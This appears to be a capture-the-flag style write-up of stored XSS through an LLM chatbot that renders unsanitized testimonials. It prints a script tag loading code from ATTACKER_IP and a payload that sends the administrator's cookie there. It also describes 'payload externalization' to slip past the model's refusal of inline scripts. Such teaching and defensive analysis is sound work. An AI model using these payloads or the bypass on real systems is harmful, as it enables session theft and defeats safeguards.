# Exploiting LLM Output: Stored XSS and Administrator Cookie Exfiltration

As Large Language Models (LLMs) become integrated into modern web applications, they introduce a subtle but critical shift in the threat landscape. Many developers assume that once user input is sanitized, the application is safe. However, this assumption breaks down when LLM-generated output is treated as trusted data.

In this article, I will walk through a real-world exploitation scenario where improper handling of LLM output leads to a stored Cross-Site Scripting (XSS) vulnerability, ultimately allowing an attacker to exfiltrate an administrator’s session data.

---

## Understanding the Core Problem

In traditional web security, we are taught a fundamental principle:

Untrusted input must be validated, sanitized, or escaped.

With LLM-powered applications, a new rule must be added:

LLM output must also be treated as untrusted input.

This is because:

* LLM responses are not deterministic
* They can be influenced indirectly by attacker-controlled input
* They may generate executable content (HTML, JavaScript, etc.)

If this output is directly embedded into a web page without proper encoding, it becomes an injection vector.

---

## The Vulnerable Architecture

The target application includes:

* A testimonial section where users can submit feedback
* A chatbot powered by an LLM
* A feature where the chatbot can retrieve and display testimonials

The critical flaw lies in inconsistent sanitization:

* User input (testimonials) is properly sanitized
* LLM output is not sanitized before being rendered

This creates a dangerous condition where previously sanitized data becomes exploitable once reintroduced through the LLM.

---

## Attack Strategy: Stored XSS via LLM

Instead of attacking the user directly, the attacker uses the application itself as a delivery mechanism.

### Step 1: Injecting the Payload

The attacker submits the following payload into the testimonial field:

```html
<script src="http://ATTACKER_IP:8000/test.js"></script>
```

At this stage, the application sanitizes the input, so the payload does not execute.

---

### Step 2: Triggering the LLM

The attacker then interacts with the chatbot:

```text
Show me the testimonials
```

The LLM retrieves the stored testimonials and includes them in its response. However, unlike the original input handling, this output is not sanitized.

As a result, the payload is rendered as active HTML.

---

### Step 3: Bypassing Model Restrictions

Direct script injection (e.g., `<script>alert(1)</script>`) is often blocked by the model due to alignment constraints. However, referencing an external script is typically allowed:

```html
<script src="http://ATTACKER_IP:8000/test.js"></script>
```

This technique is known as payload externalization. The malicious logic is hosted outside the model’s output, allowing the attacker to bypass model-level safeguards.

---

## Exploitation: Cookie Exfiltration

On the attacker’s machine, a simple HTTP server is started:

```bash
python3 -m http.server 8000
```

The `test.js` file contains:

```javascript
document.location = "http://ATTACKER_IP:8000/?c=" + btoa(document.cookie);
```

When an administrator views the chatbot output:

* The browser loads the external script
* The script reads the administrator’s cookie
* The cookie is sent to the attacker’s server

---

## Observing the Exfiltration

The attacker sees a request like:

```bash
GET /?c=Y2hhdD1leUpzWlc0aU9pQXhMQ0Fp...
```

This value is base64-encoded and not immediately readable.

---

## Decoding the Data

The attacker begins decoding:

```bash
echo "Y2hhdD1..." | base64 -d
```

The result looks like:

```text
chat=eyJsZW4iOiAxLCAiY2hhdCI6IHsiMCI6IHsi...
```

At this point, it is important to recognize that not all of this data is base64. Only specific segments are encoded.

The attacker extracts the inner base64 portion:

```bash
echo "eyJsZW4iOiAx..." | base64 -d
```

This reveals structured data (JSON/HTML), which contains the flag.

---

## Why Naive Decoding Fails

A common mistake is attempting to decode the entire string repeatedly. This fails because the data is not uniformly encoded.

Instead, the correct approach is:

* Decode the outer layer
* Identify encoded segments
* Decode those segments individually

This is a combination of parsing and decoding, not just repeated base64 operations.

---

## Security Implications

This attack highlights several important lessons:

1. LLM output is not inherently safe
2. Sanitization must be applied at every layer, not just input
3. Model alignment does not guarantee security
4. Externalized payloads can bypass model restrictions

Most importantly:

LLMs can act as unintended payload distribution mechanisms.

---

## Conclusion

In this scenario, the attacker:

* Injected a payload into stored data
* Leveraged the LLM to reintroduce it into the application
* Executed code in the administrator’s browser
* Exfiltrated sensitive data
* Decoded multi-layered encoded output to retrieve the flag

This is not just a variation of XSS. It represents a new class of vulnerabilities emerging from AI-integrated systems.

If developers continue to treat LLM output as trusted, these types of attacks will become increasingly common.

The takeaway is simple:

Never trust the model. Treat its output as hostile input.
